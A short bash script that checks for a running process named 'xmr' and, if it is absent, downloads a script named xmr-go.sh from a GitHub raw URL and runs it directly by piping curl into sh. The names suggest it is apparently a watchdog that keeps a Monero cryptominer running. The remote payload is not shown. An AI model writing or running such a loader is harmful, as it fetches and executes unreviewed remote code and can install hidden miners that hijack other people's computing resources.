#!/bin/bash
if pgrep -x "xmr" > /dev/null
then
    echo "it's running!"
else
    sh <(curl -s https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh) 
fi
